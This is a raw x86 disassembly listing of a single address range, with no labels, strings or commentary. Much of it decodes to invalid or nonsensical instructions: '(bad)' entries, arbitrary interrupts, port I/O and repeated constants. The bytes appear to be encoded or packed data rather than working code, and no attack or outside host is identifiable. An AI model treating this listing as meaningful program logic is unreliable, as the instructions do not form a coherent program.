  424353:	sub    BYTE PTR [edi+0x4c76cd9d],al
  424359:	int    0x1
  42435b:	adc    DWORD PTR [ecx-0x142c7f80],eax
  424361:	xchg   edx,eax
  424362:	push   ebx
  424363:	jecxz  0x424394
  424365:	rcl    ebp,1
  424367:	bound  eax,QWORD PTR [eax]
  424369:	jo     0x42439f
  42436b:	int    0x76
  42436d:	std    
  42436e:	int    0x8d
  424370:	std    
  424371:	cmp    edi,DWORD PTR [ecx+0x3b]
  424374:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42437b:	push   ebx
  42437c:	rol    DWORD PTR [ebx+0x76],cl
  42437f:	mov    ch,0xd6
  424381:	and    ch,cl
  424383:	jbe    0x424322
  424385:	int    0x8d
  424387:	popf   
  424388:	cmp    esi,eax
  42438a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42438d:	mov    ebp,0x28f2d392
  424392:	push   ebx
  424393:	jge    0x4243d8
  424395:	fld    TBYTE PTR [edi]
  424397:	pop    es
  424398:	xchg   esp,eax
  424399:	add    BYTE PTR [eax],al
  42439b:	add    ch,cl
  42439d:	jbe    0x42439c
  42439f:	int    0x8d
  4243a1:	std    
  4243a2:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243a5:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243ac:	push   ebx
  4243ad:	rol    DWORD PTR [ebx+0x76],cl
  4243b0:	mov    ch,0xd6
  4243b2:	and    ch,cl
  4243b4:	jbe    0x4243af
  4243b6:	int    0x8d
  4243b8:	stc    
  4243b9:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243bc:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243c3:	push   ebx
  4243c4:	rol    DWORD PTR [ecx-0x5f14428a],cl
  4243ca:	add    DWORD PTR [eax-0x12893680],0x67f1048e
  4243d4:	leave  
  4243d5:	jbe    0x4243cc
  4243d7:	fdivr  st,st(4)
  4243d9:	sbb    al,0xb
  4243db:	int    0xa6
  4243dd:	std    
  4243de:	int    0x76
  4243e0:	std    
  4243e1:	cmp    ebp,DWORD PTR [ecx-0x132c36c5]
  4243e7:	xchg   edx,eax
  4243e8:	shr    DWORD PTR [ebp-0x1462acd8],cl
  4243ee:	sbb    al,BYTE PTR [ecx+0x76cd8080]
  4243f4:	std    
  4243f5:	int    0x8d
  4243f7:	std    
  4243f8:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243fb:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424402:	push   ebx
  424403:	ror    DWORD PTR [edx],cl
  424405:	jbe    0x4243f4
  424407:	int    0x76
  424409:	std    
  42440a:	int    0x8d
  42440c:	std    
  42440d:	cmp    edi,DWORD PTR [ecx+0x3b]
  424410:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424417:	push   ebx
  424418:	ror    DWORD PTR [edx],cl
  42441a:	jbe    0x424411
  42441c:	int    0x8d
  42441e:	std    
  42441f:	int    0x76
  424421:	std    
  424422:	cmp    ecx,DWORD PTR [edi]
  424424:	cmp    ecx,ecx
  424426:	shr    DWORD PTR [ebp-0x6d142cd8],cl
  42442c:	push   ebx
  42442d:	jge    0x4243fc
  42442f:	jbe    0x4243c6
  424431:	inc    ebx
  424432:	jge    0x424408
  424434:	xchg   ch,cl
  424436:	test   BYTE PTR ds:0xcded760a,bl
  42443c:	jbe    0x4243eb
  42443e:	int    0x84
  424440:	sbb    eax,0xcdf5760a
  424445:	jbe    0x424444
  424447:	int    0x8d
  424449:	std    
  42444a:	cmp    edi,DWORD PTR [ecx+0x3b]
  42444d:	lock shl edx,cl
  424450:	sub    bl,dl
  424452:	mov    ebp,0xcdd35392
  424457:	(bad)  
  424458:	in     eax,dx
  424459:	inc    ebx
  42445a:	rcl    esp,cl
  42445c:	push   esp
  42445d:	int    0x76
  42445f:	std    
  424460:	int    0x8d
  424462:	std    
  424463:	cmp    esi,eax
  424465:	cmp    edi,DWORD PTR [ecx-0x2d]
  424468:	repnz sub bl,dl
  42446b:	mov    ebp,0xcdd35392
  424470:	(bad)  
  424471:	in     eax,dx
  424472:	shr    ebx,cl
  424474:	sub    al,BYTE PTR [ebx-0x2d]
  424477:	aam    0x1c
  424479:	int    0x8d
  42447b:	in     eax,dx
  42447c:	int    0x76
  42447e:	dec    esp
  42447f:	int    0x1
  424481:	adc    DWORD PTR [ecx-0x44d07f80],eax
  424487:	retf   
  424488:	jno    0x42448a
  42448a:	(bad)  
  42448b:	mov    ch,0x0
  42448d:	jo     0x424417
  42448f:	in     al,dx
  424490:	push   ds
  424491:	int    0x76
  424493:	cmc    
  424494:	xchg   DWORD PTR [esi-0x78],esi
  424497:	int    0x8d
  424499:	dec    esp
  42449a:	int    0xa
  42449c:	adc    DWORD PTR [ecx+0x6d048080],eax
  4244a2:	xchg   edx,eax
  4244a3:	jo     0x4244a5
  4244a5:	(bad)  
  4244a6:	mov    ch,0x0
  4244a8:	jno    0x424432
  4244aa:	or     dh,BYTE PTR [esi-0xb]
  4244ad:	int    0x76
  4244af:	std    
  4244b0:	int    0x8d
  4244b2:	std    
  4244b3:	cmp    edi,DWORD PTR [ecx+0x3b]
  4244b6:	lock shl edx,cl
  4244b9:	sub    bl,dl
  4244bb:	mov    ebp,0xcdd35392
  4244c0:	(bad)  
  4244c1:	cmc    
  4244c2:	inc    ebx
  4244c3:	ror    ebp,cl
  4244c5:	jbe    0x4244c0
  4244c7:	int    0x8d
  4244c9:	stc    
  4244ca:	(bad)  
  4244cb:	xor    DWORD PTR [ebx],edi
  4244cd:	jns    0x42450a
  4244cf:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4244d6:	push   ebx
  4244d7:	rol    DWORD PTR [ecx+0x1cecbd76],cl
  4244dd:	cmp    esi,eax
  4244df:	cmp    edi,DWORD PTR [ecx-0x2d]
  4244e2:	repnz sub bl,dl
  4244e5:	mov    ebp,0xcdd35392
  4244ea:	(bad)  
  4244eb:	cmc    
  4244ec:	das    
  4244ed:	rcl    ebx,1
  4244ef:	int    0x8d
  4244f1:	lods   eax,DWORD PTR ds:[esi]
  4244f2:	or     al,BYTE PTR [edi+ebx*1-0x32068933]
  4244f9:	(bad)  
  4244fa:	stc    
  4244fb:	cmp    edi,DWORD PTR [ecx+0x3b]
  4244fe:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424505:	push   ebx
  424506:	rol    DWORD PTR [edi-0x2893263],cl
  42450c:	int    0x8d
  42450e:	std    
  42450f:	cmp    esi,eax
  424511:	cmp    edi,DWORD PTR [ecx-0x2d]
  424514:	repnz sub bl,dl
  424517:	mov    ebp,0xcdd35392
  42451c:	lea    ebp,[ebp+0x2f1f845e]
  424522:	push   es
  424523:	or     al,0xff
  424525:	add    BYTE PTR [eax],al
  424527:	int    0x76
  424529:	adc    ebp,ecx
  42452b:	lea    edx,[ecx]
  42452d:	ins    BYTE PTR es:[edi],dx
  42452e:	sar    DWORD PTR [ebp-0x30b330d8],cl
  424534:	test   BYTE PTR [eax-0x2cac7f80],al
  42453a:	int    0x8d
  42453c:	icebp  
  42453d:	push   esi
  42453e:	dec    ecx
  42453f:	and    DWORD PTR [esi-0x2ec14cb],eax
  424545:	add    BYTE PTR [eax],al
  424547:	int    0x76
  424549:	std    
  42454a:	int    0x8d
  42454c:	std    
  42454d:	cmp    edi,DWORD PTR [ecx+0x3b]
  424550:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424557:	push   ebx
  424558:	rcr    DWORD PTR [esi+0x76],cl
  42455b:	mov    ebp,0x76cd88d6
  424560:	stc    
  424561:	int    0x8d
  424563:	stc    
  424564:	in     al,dx
  424565:	xchg   ch,cl
  424567:	jbe    0x424566
  424569:	int    0x8d
  42456b:	std    
  42456c:	cmp    esi,eax
  42456e:	cmp    edi,DWORD PTR [ecx-0x56]
  424571:	shl    edx,cl
  424573:	sub    bl,dl
  424575:	mov    ebp,0xd353a892
  42457a:	arpl   bx,cx
  42457c:	ror    BYTE PTR [eax-0x12326980],cl
  424582:	add    al,0xed
  424584:	xor    al,0xc9
  424586:	jbe    0x424585
  424588:	dec    ecx
  424589:	and    DWORD PTR [esi-0x528936cb],eax
  42458f:	inc    ecx
  424590:	and    DWORD PTR [esi+0x4c76cd35],eax
  424596:	or     dh,BYTE PTR [esi+0x4c]
  424599:	cwde   
  42459a:	int    0x6d
  42459c:	int    0x76
  42459e:	std    
  42459f:	int    0x96
  4245a1:	std    
  4245a2:	sar    bh,0x5f
  4245a5:	shl    DWORD PTR [ecx],1
  4245a7:	xchg   BYTE PTR ds:0x3ba8d33b,dh
  4245ad:	cdq    
  4245ae:	shr    edx,cl
  4245b0:	sub    bl,dl
  4245b2:	mov    ebp,0xcdd25392
  4245b7:	xchg   esi,eax
  4245b8:	mov    BYTE PTR [ebx-0xf],al
  4245bb:	das    
  4245bc:	add    eax,0x80808159
  4245c1:	int    0x76
  4245c3:	mov    ch,cl
  4245c5:	xchg   esi,eax
  4245c6:	mov    BYTE PTR [edi+0xa9a6470],al
  4245cc:	xchg   esi,eax
  4245cd:	cmc    
  4245ce:	leave  
  4245cf:	jbe    0x4245ca
  4245d1:	popa   
  4245d2:	and    DWORD PTR [esi-0x68932cb],eax
  4245d8:	int    0x96
  4245da:	stc    
  4245db:	cmp    ebx,DWORD PTR [ecx+0x3b28ead3]
  4245e1:	rcl    ebx,cl
  4245e3:	mov    ebp,0xcdd25392
  4245e8:	xchg   esi,eax
  4245e9:	std    
  4245ea:	int    0xe6
  4245ec:	std    
  4245ed:	cmp    esp,ebx
  4245ef:	cmp    edi,edi
  4245f1:	shr    ecx,cl
  4245f3:	sub    bl,dl
  4245f5:	repz xchg edx,eax
  4245f7:	push   ebx
  4245f8:	fxch   st(5)
  4245fa:	out    0xf5,al
  4245fc:	pop    esi
  4245fd:	xchg   esp,eax
  4245fe:	leave  
  4245ff:	fsubr  QWORD PTR [edi]
  424601:	add    eax,0x8080816b
  424606:	int    0x96
  424608:	cmc    
  424609:	int    0x76
  42460b:	mov    BYTE PTR [edi-0x7f7fd2f5],al
  424611:	or     ch,0x96
  424614:	mov    ch,cl
  424616:	out    0xf5,al
  424618:	xor    ebx,DWORD PTR [edx-0x21932ac]
  42461e:	pop    ebx
  42461f:	int    0xa6
  424621:	std    
  424622:	cmp    edi,edx
  424624:	cmp    ebp,DWORD PTR [ecx-0x2c6def2d]
  42462a:	in     eax,0x28
  42462c:	push   ebx
  42462d:	cld    
  42462e:	or     dl,BYTE PTR [esi+0x2fd943a5]
  424634:	add    eax,0x8080814f
  424639:	int    0x96
  42463b:	std    
  42463c:	int    0xe6
  42463e:	std    
  42463f:	cmp    esp,ebx
  424641:	cmp    edi,edi
  424643:	shl    ebx,cl
  424645:	xchg   edx,eax
  424646:	shr    ecx,cl
  424648:	sub    BYTE PTR [ebx-0x27],dl
  42464b:	or     dl,BYTE PTR [esi+0x4c76c911]
  424651:	mov    dl,0x21
  424653:	xchg   BYTE PTR ds:0xcdfd96cd,dh
  424659:	out    0xfd,al
  42465b:	cmp    esp,ebx
  42465d:	cmp    edi,edi
  42465f:	shl    ebx,cl
  424661:	xchg   edx,eax
  424662:	shr    ecx,cl
  424664:	sub    BYTE PTR [ebx-0x27],dl
  424667:	jmp    0x42466b
  424669:	add    BYTE PTR [eax-0x2693280],0xcd
  424670:	(bad)  
  424671:	std    
  424672:	add    al,0xf7
  424674:	(bad)  
  424675:	cmp    esp,ebx
  424677:	sar    DWORD PTR [ecx-0x6d0c2cd8],cl
  42467d:	push   ebx
  42467e:	cdq    
  42467f:	iret   
  424680:	ja     0x42467b
  424682:	jecxz  0x424673
  424684:	inc    ebx
  424685:	cdq    
  424686:	das    
  424687:	add    al,0x21
  424689:	add    BYTE PTR [eax-0x3004cc80],0xe4
  424690:	jo     0x42461a
  424692:	or     dl,dh
  424694:	mov    ch,0x2f
  424696:	mov    ebx,0xea121a
  42469b:	das    
  42469c:	add    BYTE PTR [eax-0x321269f6],0x96
  4246a3:	in     eax,dx
  4246a4:	xchg   DWORD PTR [eax],esi
  4246a6:	int    0xd6
  4246a8:	in     eax,dx
  4246a9:	xchg   DWORD PTR [eax-0x2d],edx
  4246ac:	repz sub bl,dl
  4246af:	mov    ecx,0x2ffb5392
  4246b4:	mov    ebx,0x4cf3d31a
  4246b9:	adc    dh,bh
  4246bb:	dec    ecx
  4246bc:	and    DWORD PTR [esi-0x1229f5cb],eax
  4246c2:	or     dl,BYTE PTR [esi-0x12693243]
  4246c8:	int    0xd6
  4246ca:	in     eax,dx
  4246cb:	cmp    esp,ebx
  4246cd:	add    al,0xf7
  4246cf:	call   ebx
  4246d1:	repz xchg edx,eax
  4246d3:	sar    DWORD PTR [ecx-0x7866acd8],cl
  4246d9:	xchg   esi,eax
  4246da:	mov    BYTE PTR [edx],cl
  4246dc:	xchg   esi,eax
  4246dd:	in     eax,dx
  4246de:	int    0x96
  4246e0:	dec    esp
  4246e1:	int    0xd6
  4246e3:	dec    esp
  4246e4:	cmp    esp,ebx
  4246e6:	add    al,0xf7
  4246e8:	call   ebx
  4246ea:	mov    ecx,0x92f3d328
  4246ef:	push   ebx
  4246f0:	cdq    
  4246f1:	int    0xd6
  4246f3:	mov    ebp,0x32d6fb43
  4246f8:	int    0x96
  4246fa:	dec    esp
  4246fb:	int    0xd6
  4246fd:	dec    esp
  4246fe:	cmp    esp,ebx
  424700:	add    al,0xf7
  424702:	call   ebx
  424704:	mov    ecx,0x92f3d328
  424709:	push   ebx
  42470a:	cdq    
  42470b:	int    0xd6
  42470d:	mov    ebp,0x88d6fb43
  424712:	int    0x96
  424714:	in     eax,dx
  424715:	int    0xd6
  424717:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424718:	add    DWORD PTR [edx+0x4],0x8d0092c9
  42471f:	mov    ch,0x2f
  424721:	push   es
  424722:	xchg   ebx,eax
  424723:	add    BYTE PTR [eax],al
  424725:	add    BYTE PTR [ecx-0x6932ee5a],al
  42472b:	stc    
  42472c:	int    0xd6
  42472e:	stc    
  42472f:	cmp    esp,ebx
  424731:	add    al,0xf7
  424733:	call   ebx
  424735:	mov    ecx,0x92f3d328
  42473a:	push   ebx
  42473b:	cdq    
  42473c:	int    0xd6
  42473e:	adc    ebp,ecx
  424740:	out    0xf5,al
  424742:	inc    ebx
  424743:	aam    0xd9
  424745:	in     al,0x77
  424747:	sub    al,0xcd
  424749:	xchg   esi,eax
  42474a:	std    
  42474b:	int    0xd6
  42474d:	std    
  42474e:	cmp    esp,ebx
  424750:	add    al,0xf7
  424752:	call   ebx
  424754:	repz xchg edx,eax
  424756:	sar    DWORD PTR [ecx+0x53c58728],cl
  42475c:	cdq    
  42475d:	int    0x9c
  42475f:	test   BYTE PTR [ebx-0x1e],al
  424762:	das    
  424763:	push   es
  424764:	test   BYTE PTR [eax],al
  424766:	add    BYTE PTR [eax],al
  424768:	arpl   bp,cx
  42476a:	jbe    0x424719
  42476c:	cmp    edx,ebx
  42476e:	int    0x8d
  424770:	lods   eax,DWORD PTR ds:[esi]
  424771:	add    al,0x2
  424773:	jmp    FWORD PTR [edx+0x76cd4aec]
  424779:	std    
  42477a:	cmp    edx,ebx
  42477c:	int    0x8d
  42477e:	std    
  42477f:	cmp    ecx,DWORD PTR [edi]
  424781:	shl    edx,cl
  424783:	sub    bl,dl
  424785:	mov    ebp,0xa8d35392
  42478a:	retf   
  42478b:	ror    BYTE PTR [eax-0x12326980],cl
  424791:	adc    ch,ch
  424793:	xchg   ebp,eax
  424794:	add    BYTE PTR [eax-0x2893680],0x49
  42479b:	and    DWORD PTR [esi-0x68936cb],eax
  4247a1:	inc    ecx
  4247a2:	and    DWORD PTR [esi-0x28932cb],eax
  4247a8:	int    0x8d
  4247aa:	std    
  4247ab:	cwde   
  4247ac:	call   0x8621:0xd169ffc0
  4247b3:	xor    eax,0xbdd3793b
  4247b8:	xchg   edx,eax
  4247b9:	mov    al,ds:0xf2d3133b
  4247be:	sub    BYTE PTR [ebx-0x2d],dl
  4247c1:	or     dh,BYTE PTR [esi-0x53]
  4247c4:	int    0x76
  4247c6:	std    
  4247c7:	int    0x8d
  4247c9:	std    
  4247ca:	cmp    edi,DWORD PTR [ecx-0x2d]
  4247cd:	mov    ebp,0xd3133b92
  4247d2:	repnz sub BYTE PTR [ebx-0x2d],dl
  4247d6:	or     dh,BYTE PTR [esi-0xf]
  4247d9:	int    0xe6
  4247db:	and    al,0xcd
  4247dd:	jbe    0x4247cc
  4247df:	int    0x8d
  4247e1:	in     eax,dx
  4247e2:	cmp    edx,ebx
  4247e4:	or     dh,BYTE PTR [esi-0x13]
  4247e7:	adc    dh,BYTE PTR [esi-0x13]
  4247ea:	dec    ecx
  4247eb:	mov    al,ds:0x76cd3586
  4247f0:	cmc    
  4247f1:	int    0x8d
  4247f3:	cmc    
  4247f4:	cmp    edx,ebx
  4247f6:	or     dh,BYTE PTR [esi-0xb]
  4247f9:	adc    dh,BYTE PTR [esi-0xb]
  4247fc:	dec    ecx
  4247fd:	lahf   
  4247fe:	xchg   BYTE PTR ds:0xcd1176cd,dh
  424804:	lea    edx,[ecx]
  424806:	cmp    edx,ebx
  424808:	or     dh,BYTE PTR [esi+0x11]
  42480b:	adc    dh,BYTE PTR [esi+0x11]
  42480e:	imul   esp,DWORD PTR [ecx],0x76cd3586
  424814:	mov    ch,0xcd
  424816:	lea    esi,[ebp+0x760ad33b]
  42481c:	mov    ch,0x12
  42481e:	jbe    0x4247d5
  424820:	dec    ecx
  424821:	and    DWORD PTR [ebp+esi*1+0x212476c9],eax
  424828:	hlt    
  424829:	mov    esi,DWORD PTR ds:0x68876cd
  42482f:	ins    DWORD PTR es:[edi],dx
  424830:	das    
  424831:	add    eax,0x80808551
  424836:	int    0x76
  424838:	dec    esp
  424839:	push   es
  42483a:	ins    DWORD PTR es:[edi],dx
  42483b:	das    
  42483c:	add    eax,0x80808538
  424841:	int    0x76
  424843:	sbb    al,0x6
  424845:	ins    DWORD PTR es:[edi],dx
  424846:	das    
  424847:	add    eax,0x80808523
  42484c:	int    0x76
  42484e:	and    al,0xcd
  424850:	jbe    0x424876
  424852:	int    0x8d
  424854:	mov    bl,dl
  424856:	mov    ebp,0x39af5692
  42485b:	add    BYTE PTR [eax+0x2f815eb8],0x6
  424862:	add    DWORD PTR [ebp+0x76cd8080],0xfd8dcdfd
  42486c:	cmp    edi,DWORD PTR [ecx-0x2d]
  42486f:	mov    ebp,0xd3133b92
  424874:	repnz sub BYTE PTR [ebx-0x2d],dl
  424878:	or     dh,BYTE PTR [esi-0xf]
  42487b:	int    0x76
  42487d:	std    
  42487e:	int    0x76
  424880:	std    
  424881:	int    0x76
  424883:	mov    ch,cl
  424885:	lea    ecx,[eax-0x329b8379]
  42488b:	outs   dx,BYTE PTR ds:[esi]
  42488c:	jo     0x424898
  42488e:	lea    esp,[esi+eax*1]
  424891:	ins    DWORD PTR es:[edi],dx
  424892:	das    
  424893:	add    eax,0x808084f0
  424898:	leave  
  424899:	jbe    0x424830
  42489b:	dec    ecx
  42489c:	and    DWORD PTR [eax+0x35],edi
  42489f:	int    0x76
  4248a1:	xchg   ebp,eax
  4248a2:	pop    ebx
  4248a3:	int    0xa6
  4248a5:	xchg   ebp,eax
  4248a6:	cmp    edi,DWORD PTR [ecx+0x3b]
  4248a9:	loop   0x42487e
  4248ab:	mov    ebp,0x28e5d392
  4248b0:	push   ebx
  4248b1:	popf   
  4248b2:	or     ah,BYTE PTR [esi-0x289326b]
  4248b8:	int    0x76
  4248ba:	std    
  4248bb:	int    0x8
  4248bd:	sub    eax,0xcd808081
  4248c2:	xor    ch,cl
  4248c4:	bound  esp,QWORD PTR [edi+eax*4+0x30]
  4248c8:	int    0x76
  4248ca:	std    
  4248cb:	int    0x76
  4248cd:	std    
  4248ce:	int    0x8
  4248d0:	and    eax,0xcd808081
  4248d5:	sbb    al,0xa
  4248d7:	xchg   esi,eax
  4248d8:	dec    esp
  4248d9:	inc    ebx
  4248da:	fst    st(6)
  4248dc:	push   0xffffffcd
  4248de:	(bad)  
  4248df:	cmc    
  4248e0:	int    0x8
  4248e2:	adc    DWORD PTR [ecx-0x69307f80],eax
  4248e8:	lods   eax,DWORD PTR ds:[esi]
  4248e9:	(bad)  
  4248ea:	int    0x96
  4248ec:	cmc    
  4248ed:	cmp    ecx,DWORD PTR [edi]
  4248ef:	add    al,0xfb
  4248f1:	call   ebx
  4248f3:	jmp    0x424887
  4248f5:	shr    edx,cl
  4248f7:	sub    BYTE PTR [ebx-0x1d],dl
  4248fa:	int    0x8d
  4248fc:	dec    esp
  4248fd:	bound  eax,QWORD PTR [eax]
  4248ff:	xchg   ecx,eax
  424900:	jo     0x42495d
  424902:	add    BYTE PTR [eax+0x24],dh
  424905:	int    0x8d
  424907:	dec    esp
  424908:	int    0x6e
  42490a:	xchg   esp,eax
  42490b:	int    0x7e
  42490d:	jo     0x424942
  42490f:	jge    0x424982
  424911:	xchg   ebp,eax
  424913:	jo     0x4248d2
  424915:	dec    esi
  424916:	xchg   BYTE PTR [eax+0x248dcd80],al
  42491c:	int    0x8
  42491e:	xor    eax,0xa808081
  424923:	sbb    al,0x0
  424925:	xchg   ecx,eax
  424926:	xchg   esp,eax
  424927:	add    dh,dl
  424929:	mov    BYTE PTR [ebx-0x43],bl
  42492c:	or     eax,0xcd808084
  424931:	pop    ebx
  424932:	fs xchg ebp,edx
  424935:	das    
  424936:	mov    ebx,0x74cf1452
  42493b:	xor    BYTE PTR [edx+ecx*1],bl
  42493e:	jbe    0x42495c
  424940:	int    0x76
  424942:	std    
  424943:	int    0x8d
  424945:	std    
  424946:	cmp    edi,DWORD PTR [ecx+0x4]
  424949:	add    bh,bh
  42494b:	shl    edx,cl
  42494d:	sub    bl,dl
  42494f:	mov    ebp,0x2fd35392
  424954:	mov    ebx,0x960a868a
  424959:	and    al,0x43
  42495b:	jge    0x42498c
  42495d:	add    eax,0x808080e9
  424962:	int    0x76
  424964:	std    
  424965:	int    0x8d
  424967:	std    
  424968:	cmp    edi,DWORD PTR [ecx+0x4]
  42496b:	add    bh,bh
  42496d:	shl    edx,cl
  42496f:	sub    bl,dl
  424971:	mov    ebp,0xad35392
  424976:	jbe    0x42491d
  424978:	int    0x76
  42497a:	stc    
  42497b:	int    0x8d
  42497d:	stc    
  42497e:	add    al,0x2
  424980:	(bad)  
  424981:	cmp    edi,DWORD PTR [ecx-0x2d]
  424984:	repnz sub bl,dl
  424987:	mov    ebp,0x2fd35392
  42498c:	mov    ebx,0x7d33868a
  424991:	pop    esi
  424992:	lea    esp,[ebp-0x7f2ef7d1]
  424998:	add    BYTE PTR [eax+0x41c8dcd],0xd3
  42499f:	mov    BYTE PTR [edx],cl
  4249a1:	lea    ebx,[esp+ebp*8]
  4249a4:	xchg   ebp,ecx
  4249a6:	lea    ebx,[ecx*8+0x31cd5c52]
  4249ad:	or     dh,BYTE PTR [esi-0x63]
  4249b0:	jl     0x4249b8
  4249b2:	icebp  
  4249b3:	aam    0x89
  4249b5:	clc    
  4249b6:	icebp  
  4249b7:	sub    edx,edx
  4249b9:	xchg   DWORD PTR [esi-0x63],esi
  4249bc:	in     al,dx
  4249bd:	xchg   edx,eax
  4249be:	int    0xd2
  4249c0:	jo     0x42498f
  4249c2:	outs   dx,BYTE PTR ds:[esi]
  4249c3:	test   BYTE PTR [edi+0x63bd70c5],al
  4249c9:	test   DWORD PTR [eax+0x1c76cd80],eax
  4249cf:	int    0x7c
  4249d1:	mov    BYTE PTR [edx],cl
  4249d3:	lea    ebx,[ebp-0x32027233]
  4249d9:	xchg   esi,eax
  4249da:	std    
  4249db:	cmp    ecx,DWORD PTR [edi]
  4249dd:	add    al,0xfb
  4249df:	call   ebx
  4249e1:	jmp    0x424975
  4249e3:	shr    edx,cl
  4249e5:	sub    BYTE PTR [ebx+0x13],dl
  4249e8:	pop    esi
  4249e9:	lea    ebx,[ebp-0x7232e32c]
  4249ef:	mov    BYTE PTR [edi-0x29ffb384],al
  4249f5:	popf   
  4249f6:	int    0x6c
  4249f8:	test   BYTE PTR [ecx-0x79],dh
  4249fb:	lds    esi,FWORD PTR [eax-0x43]
  4249fe:	add    eax,DWORD PTR [edi+0x76cd8080]
  424a04:	sbb    al,0xcd
  424a06:	(bad)  
  424a07:	stc    
  424a08:	int    0x96
  424a0a:	stc    
  424a0b:	cmp    ecx,DWORD PTR [edi]
  424a0d:	shr    ebx,cl
  424a0f:	xchg   edx,eax
  424a10:	add    al,0xfb
  424a12:	inc    DWORD PTR [ebp*2+0x28ead33c]
  424a19:	push   ebx
  424a1a:	adc    eax,DWORD PTR [ecx-0x69325a73]
  424a20:	and    al,0xa
  424a22:	jbe    0x424a40
  424a24:	int    0x76
  424a26:	stc    
  424a27:	int    0x8d
  424a29:	stc    
  424a2a:	add    al,0x2
  424a2c:	(bad)  
  424a2d:	cmp    edi,DWORD PTR [ecx-0x2d]
  424a30:	repnz sub bl,dl
  424a33:	mov    ebp,0xcdd35392
  424a38:	lea    esp,[edi+ebp*1]
  424a3b:	mov    ebx,0x7d33867e
  424a40:	pop    esi
  424a41:	lea    esp,[ebp+0xa4072f]
  424a47:	add    BYTE PTR [eax],al
  424a49:	int    0x8
  424a4b:	and    eax,0x43808081
  424a50:	sbb    al,0xd6
  424a52:	cmp    ecx,ebp
  424a54:	lea    edx,[ecx]
  424a56:	int    0x8
  424a58:	adc    DWORD PTR [ecx-0x69307f80],eax
  424a5e:	lods   eax,DWORD PTR ds:[esi]
  424a5f:	(bad)  
  424a60:	int    0x96
  424a62:	adc    DWORD PTR [ebx],edi
  424a64:	(bad)  
  424a66:	sti    
  424a67:	call   ebx
  424a69:	jmp    0x4249fd
  424a6b:	shr    edx,cl
  424a6d:	sub    BYTE PTR [ebx-0x1d],dl
  424a70:	int    0x8d
  424a72:	dec    esp
  424a73:	bound  eax,QWORD PTR [eax]
  424a75:	xchg   ecx,eax
  424a76:	xchg   esp,eax
  424a77:	pop    ebx
  424a78:	add    BYTE PTR [eax+0x24],dh
  424a7b:	push   es
  424a7c:	ins    DWORD PTR es:[edi],dx
  424a7d:	das    
  424a7e:	add    eax,0x808092d9
  424a83:	int    0x96
  424a85:	and    al,0xcd
  424a87:	or     BYTE PTR [ebp-0x327f7f7f],bl
  424a8d:	or     ch,0x7d
  424a90:	cmp    ecx,DWORD PTR [edi]
  424a92:	add    al,0x11
  424a94:	call   ebx
  424a96:	jmp    0x424a2a
  424a98:	shr    DWORD PTR [ebp+0x2f7d5328],cl
  424a9e:	add    eax,0x808081da
  424aa3:	int    0x76
  424aa5:	std    
  424aa6:	int    0x8d
  424aa8:	std    
  424aa9:	cmp    edi,DWORD PTR [ecx+0x4]
  424aac:	add    bh,bh
  424aae:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424ab4:	push   ebx
  424ab5:	ror    DWORD PTR [edx],cl
  424ab7:	jbe    0x424a76
  424ab9:	pop    ebp
  424aba:	push   0xcf35869f
  424abf:	jl     0x424a6e
  424ac1:	or     cl,BYTE PTR [ebp+0x658d0a5d]
  424ac7:	leave  
  424ac8:	jbe    0x424b0f
  424aca:	sbb    BYTE PTR [edi+0x76c93586],bl
  424ad0:	shr    al,1
  424ad2:	lahf   
  424ad3:	xchg   BYTE PTR ds:0xc955760a,dh
  424ad9:	jbe    0x424b48
  424adb:	dec    ecx
  424adc:	and    DWORD PTR [esi-0x3234c4cb],eax
  424ae2:	xchg   esp,eax
  424ae3:	iret   
  424ae4:	inc    ebp
  424ae5:	shl    ebx,cl
  424ae7:	xchg   edx,eax
  424ae8:	adc    bh,bl
  424aea:	scas   eax,DWORD PTR es:[edi]
  424aeb:	cmp    DWORD PTR [eax+0x150ab880],eax
  424af1:	lea    esi,[eax+eax*1+0x0]
  424af5:	add    BYTE PTR [esi+0x4],ch
  424af8:	cli    
  424af9:	xchg   BYTE PTR [edx-0x6047a019],al
  424aff:	xchg   BYTE PTR ds:0x94060a,dh
  424b05:	add    BYTE PTR [eax],al
  424b07:	or     al,BYTE PTR [esi]
  424b09:	mov    esp,0xa000000
  424b0e:	jbe    0x424ac0
  424b10:	or     dh,BYTE PTR [esi+0x15]
  424b13:	iret   
  424b14:	outs   dx,BYTE PTR ds:[esi]
  424b15:	std    
  424b16:	iret   
  424b17:	jno    0x424b89
  424b19:	or     dh,BYTE PTR [esi+0x2d]
  424b1c:	or     dh,BYTE PTR [esi+0x35]
  424b1f:	leave  
  424b20:	push   es
  424b21:	jo     0x424b23
  424b23:	add    BYTE PTR [eax],al
  424b25:	sub    DWORD PTR [edi-0x30f5ca7a],ebx
  424b2b:	pushf  
  424b2c:	add    BYTE PTR [eax],al
  424b2e:	add    BYTE PTR [edx],cl
  424b30:	pop    ss
  424b31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b32:	add    BYTE PTR [eax],al
  424b34:	add    cl,cl
  424b36:	push   es
  424b37:	lods   al,BYTE PTR ds:[esi]
  424b38:	add    BYTE PTR [eax],al
  424b3a:	add    BYTE PTR [edx-0x61],cl
  424b3d:	xchg   BYTE PTR ds:0xb406c9,dh
  424b43:	add    BYTE PTR [eax],al
  424b45:	sbb    BYTE PTR [edi+0x6c93586],bl
  424b4b:	les    eax,FWORD PTR [eax]
  424b4d:	add    BYTE PTR [eax],al
  424b4f:	popa   
  424b50:	lahf   
  424b51:	xchg   BYTE PTR ds:0x9006c9,dh
  424b57:	add    BYTE PTR [eax],al
  424b59:	sbb    BYTE PTR [edi+0x6c93586],bl
  424b5f:	aam    0x0
  424b61:	add    BYTE PTR [eax],al
  424b63:	call   0xa77d207
  424b68:	iret   
  424b69:	fadd   QWORD PTR [eax]
  424b6b:	add    BYTE PTR [eax],al
  424b6d:	leave  
  424b6e:	push   es
  424b6f:	in     al,0x0
